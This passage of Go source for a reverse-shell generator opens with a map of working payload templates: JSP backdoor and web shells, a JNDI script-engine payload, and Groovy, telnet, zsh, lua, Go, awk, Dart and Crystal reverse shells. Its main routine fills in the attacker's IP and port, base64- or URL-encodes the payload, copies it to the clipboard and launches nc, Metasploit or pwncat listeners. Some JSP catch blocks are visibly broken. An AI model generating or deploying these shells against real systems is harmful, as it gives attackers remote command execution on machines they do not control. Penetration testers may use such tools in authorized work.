        "java_web":          "<%@\r\npage import=\"java.lang.*, java.util.*, java.io.*, java.net.*\"\r\n% >\r\n<%!\r\nstatic class StreamConnector extends Thread\r\n{\r\n        InputStream is;\r\n        OutputStream os;\r\n        StreamConnector(InputStream is, OutputStream os)\r\n        {\r\n                this.is = is;\r\n                this.os = os;\r\n        }\r\n        public void run()\r\n        {\r\n                BufferedReader isr = null;\r\n                BufferedWriter osw = null;\r\n                try\r\n                {\r\n                        isr = new BufferedReader(new InputStreamReader(is));\r\n                        osw = new BufferedWriter(new OutputStreamWriter(os));\r\n                        char buffer[] = new char[8192];\r\n                        int lenRead;\r\n                        while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)\r\n                        {\r\n                                osw.write(buffer, 0, lenRead);\r\n                                osw.flush();\r\n                        }\r\n                }\r\n                catch (Exception ioe)\r\n                try\r\n                {\r\n                        if(isr != null) isr.close();\r\n                        if(osw != null) osw.close();\r\n                }\r\n                catch (Exception ioe)\r\n        }\r\n}\r\n%>\r\n\r\n<h1>JSP Backdoor Reverse Shell</h1>\r\n\r\n<form method=\"post\">\r\nIP Address\r\n<input type=\"text\" name=\"ipaddress\" size=30>\r\nPort\r\n<input type=\"text\" name=\"port\" size=10>\r\n<input type=\"submit\" name=\"Connect\" value=\"Connect\">\r\n</form>\r\n<p>\r\n<hr>\r\n\r\n<%\r\nString ipAddress = request.getParameter(\"ipaddress\");\r\nString ipPort = request.getParameter(\"port\");\r\nif(ipAddress != null && ipPort != null)\r\n{\r\n        Socket sock = null;\r\n        try\r\n        {\r\n                sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());\r\n                Runtime rt = Runtime.getRuntime();\r\n                Process proc = rt.exec(\"cmd.exe\");\r\n                StreamConnector outputConnector =\r\n                        new StreamConnector(proc.getInputStream(),\r\n                                          sock.getOutputStream());\r\n                StreamConnector inputConnector =\r\n                        new StreamConnector(sock.getInputStream(),\r\n                                          proc.getOutputStream());\r\n                outputConnector.start();\r\n                inputConnector.start();\r\n        }\r\n        catch(Exception e) \r\n}\r\n%>",
        "java_two_way":      "<%\r\n    /*\r\n     * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.\r\n     * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML.\r\n     * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button \"send\" is clicked, it will try to connect to the reverse shell again (apart from executing \r\n     * the command specified in the HTML form). This is to avoid to keep it simple.\r\n     */\r\n%>\r\n\r\n<%@page import=\"java.lang.*\"%>\r\n<%@page import=\"java.io.*\"%>\r\n<%@page import=\"java.net.*\"%>\r\n<%@page import=\"java.util.*\"%>\r\n\r\n<html>\r\n<head>\r\n    <title>jrshell</title>\r\n</head>\r\n<body>\r\n<form METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">\r\n    <input TYPE=\"text\" NAME=\"shell\">\r\n    <input TYPE=\"submit\" VALUE=\"Send\">\r\n</form>\r\n<pre>\r\n<%\r\n    // Define the OS\r\n    String shellPath = null;\r\n    try\r\n    {\r\n        if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1) {\r\n            shellPath = new String(\"/bin/sh\");\r\n        } else {\r\n            shellPath = new String(\"cmd.exe\");\r\n        }\r\n    } catch( Exception e ){}\r\n    // INNER HTML PART\r\n    if (request.getParameter(\"shell\") != null) {\r\n        out.println(\"Command: \" + request.getParameter(\"shell\") + \"\\n<BR>\");\r\n        Process p;\r\n        if (shellPath.equals(\"cmd.exe\"))\r\n            p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParameter(\"shell\"));\r\n        else\r\n            p = Runtime.getRuntime().exec(\"/bin/sh -c \" + request.getParameter(\"shell\"));\r\n        OutputStream os = p.getOutputStream();\r\n        InputStream in = p.getInputStream();\r\n        DataInputStream dis = new DataInputStream(in);\r\n        String disr = dis.readLine();\r\n        while ( disr != null ) {\r\n            out.println(disr);\r\n            disr = dis.readLine();\r\n        }\r\n    }\r\n    // TCP PORT PART\r\n    class StreamConnector extends Thread\r\n    {\r\n        InputStream wz;\r\n        OutputStream yr;\r\n        StreamConnector( InputStream wz, OutputStream yr ) {\r\n            this.wz = wz;\r\n            this.yr = yr;\r\n        }\r\n        public void run()\r\n        {\r\n            BufferedReader r  = null;\r\n            BufferedWriter w = null;\r\n            try\r\n            {\r\n                r  = new BufferedReader(new InputStreamReader(wz));\r\n                w = new BufferedWriter(new OutputStreamWriter(yr));\r\n                char buffer[] = new char[8192];\r\n                int length;\r\n                while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )\r\n                {\r\n                    w.write( buffer, 0, length );\r\n                    w.flush();\r\n                }\r\n            } catch( Exception e ){}\r\n            try\r\n            {\r\n                if( r != null )\r\n                    r.close();\r\n                if( w != null )\r\n                    w.close();\r\n            } catch( Exception e ){}\r\n        }\r\n    }\r\n \r\n    try {\r\n        Socket socket = new Socket( \"{ip}\", {port} ); // Replace with wanted ip and port\r\n        Process process = Runtime.getRuntime().exec( shellPath );\r\n        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();\r\n        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();\r\n        out.println(\"port opened on \" + socket);\r\n     } catch( Exception e ) {}\r\n%>\r\n</pre>\r\n</body>\r\n</html>",
        "javascript":        "String command = \"var host = '{ip}';\" +\r\n                       \"var port = {port};\" +\r\n                       \"var cmd = '{shell}';\"+\r\n                       \"var s = new java.net.Socket(host, port);\" +\r\n                       \"var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();\"+\r\n                       \"var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\"+\r\n                       \"var po = p.getOutputStream(), so = s.getOutputStream();\"+\r\n                       \"print ('Connected');\"+\r\n                       \"while (!s.isClosed()) {\"+\r\n                       \"    while (pi.available() > 0)\"+\r\n                       \"        so.write(pi.read());\"+\r\n                       \"    while (pe.available() > 0)\"+\r\n                       \"        so.write(pe.read());\"+\r\n                       \"    while (si.available() > 0)\"+\r\n                       \"        po.write(si.read());\"+\r\n                       \"    so.flush();\"+\r\n                       \"    po.flush();\"+\r\n                       \"    java.lang.Thread.sleep(50);\"+\r\n                       \"    try {\"+\r\n                       \"        p.exitValue();\"+\r\n                       \"        break;\"+\r\n                       \"    }\"+\r\n                       \"    catch (e) {\"+\r\n                       \"    }\"+\r\n                       \"}\"+\r\n                       \"p.destroy();\"+\r\n                       \"s.close();\";\r\nString x = \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"\"+command+\"\\\")\";\r\nref.add(new StringRefAddr(\"x\", x);",
        "groovy":            "String host=\"{ip}\";int port={port};String cmd=\"{shell}\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){};p.destroy();s.close();",
        "telnet":            "TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | {shell} 1>$TF",
        "zsh":               "zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
        "lua1":              "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('{shell} -i <&3 >&3 2>&3');\"",
        "lua2":              "lua5.1 -e 'local host, port = \"{ip}\", {port} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'",
        "golang":            "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"{shell}\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
        "vlang":             "echo 'import os' > /tmp/t.v && echo 'fn main() { os.system(\"nc -e {shell} {ip} {port} 0>&1\") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v",
        "awk":               "awk 'BEGIN {s = \"/inet/tcp/0/{ip}/{port}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }' /dev/null",
        "dart":              "import 'dart:io';\nimport 'dart:convert';\n\nmain() {\n  Socket.connect(\"{ip}\", {port}).then((socket) {\n    socket.listen((data) {\n      Process.start('{shell}', []).then((Process process) {\n        process.stdin.writeln(new String.fromCharCodes(data).trim());\n        process.stdout\n          .transform(utf8.decoder)\n          .listen((output) { socket.write(output); });\n      });\n    },\n    onDone: () {\n      socket.destroy();\n    });\n  });\n}",
        "crystal_system":    "crystal eval 'require \"process\";require \"socket\";c=Socket.tcp(Socket::Family::INET);c.connect(\"{ip}\",{port});loop{m,l=c.receive;p=Process.new(m.rstrip(\"\\n\"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'",
        "crystal_code":      "require \"process\"\nrequire \"socket\"\n\nc = Socket.tcp(Socket::Family::INET)\nc.connect(\"{ip}\", {port})\nloop do \n  m, l = c.receive\n  p = Process.new(m.rstrip(\"\\n\"), output:Process::Redirect::Pipe, shell:true)\n  c << p.output.gets_to_end\nend"}

        listShells := flag.Bool("L", false, "List all available shells")
        listenerMode := flag.String("mode", "gui", "Mode for listener (gui/cli)")
        listenerType := flag.String("l", "", "Type of listener (nc, msf, pwncat)")
        encoding := flag.String("e", "none", "Encoding method: base64, 2xbase64, or urlenc")
        shell := flag.String("s", "bash", "the shell to use")
        ip := flag.String("i", "tun0", "the IP address")
        port := flag.String("p", "4444", "the port number")
        revShell := flag.String("r", "bash", "Choose the reverse shell format")
    
        flag.Parse()
        if *listShells {
            listShellsInColumns(shellFormatMap)
            return
        }
        // If the IP flag is not provided, use the IP from getTun0IP()
        if *ip == "tun0" {
            *ip = getTun0IP() // Corrected assignment
        }
        shellTemplate, exists := shellFormatMap[*revShell]
        if !exists {
            fmt.Println(colorRed + "[-]" + colorReset + "Invalid reverse shell format specified\nList shells with -L")
            return
        }
        if *listShells {
            listShellsInColumns(shellFormatMap)
            return
        }
        shellTemplate = strings.ReplaceAll(shellTemplate, "{shell}", *shell)
        shellTemplate = strings.ReplaceAll(shellTemplate, "{ip}", *ip)
        shellTemplate = strings.ReplaceAll(shellTemplate, "{port}", *port)
        switch *encoding {
        case "base64":
            shellTemplate = base64Encode(shellTemplate)
        case "2xbase64":
            shellTemplate = doubleBase64Encode(shellTemplate)
        case "urlenc":
            shellTemplate = urlEncode(shellTemplate)
        }
        fmt.Println(colorRed + "============ SHELL CODE ============" + colorReset)
        fmt.Println(shellTemplate)
        fmt.Println(colorRed + "====================================" + colorReset)
        err := clipboard.WriteAll(shellTemplate)
        if err != nil {
            fmt.Println("Failed to copy to clipboard:", err)
            return
        }
        fmt.Println(colorGreen + "[+]" + colorReset + " Reverse shell code copied to clipboard.")
        if *listenerType != "" {
            var command string

            switch *listenerType {
            case "nc":
                command = fmt.Sprintf("nc -lvns %s -p %s", *ip, *port)
            case "msf":
                // Create a resource script
                resourceScript := "use exploit/multi/handler\n" +
                                  "set PAYLOAD payload/generic/shell_reverse_tcp\n" + // Set your payload
                                  fmt.Sprintf("set LHOST %s\n", *ip) +
                                  fmt.Sprintf("set LPORT %s\n", *port) +
                                  "exploit\n"
            
                // Write the resource script to a temporary file
                tmpfile, err := os.CreateTemp("", "msfscript")
                if err != nil {
                    log.Fatal(err)
                }
            
                if _, err := tmpfile.Write([]byte(resourceScript)); err != nil {
                    tmpfile.Close()
                    log.Fatal(err)
                }
                if err := tmpfile.Close(); err != nil {
                    log.Fatal(err)
                }
            
                // Construct the command to run msfconsole with the resource script
                command = fmt.Sprintf("msfconsole -r %s", tmpfile.Name())  
            case "pwncat":
                command = fmt.Sprintf("python3 -m pwncat -l %s -p %s", *ip, *port)
            default:
                fmt.Println(colorRed + "[-]" + colorReset + " Invalid listener type specified")
                return
            }
            if *listenerMode == "cli" {
                // Run in tmux for CLI mode
                command = "tmux new -d -s listener '" + command + "'"
            } else {
                // Run in x-terminal-emulator for GUI mode
                // If you need a diff term change this
                command = "x-terminal-emulator -e '" + command + "'"
            }
        
            // Execute the command
            cmd := exec.Command("bash", "-c", command)
            err := cmd.Start()
            if err != nil {
                fmt.Printf(colorRed + "[-]" + colorReset + " Failed to start listener: %v\n", err)
                return
            }
            if *listenerMode == "cli" {
                fmt.Println(colorGreen + "[+]" + colorReset + " Listener started in a new screen session\n    Use `tmux attach-session -t listener` to connect.")
            } else {
                fmt.Println(colorGreen + "[+]" + colorReset + " Listener started in a new terminal")
            }    
        }
    }
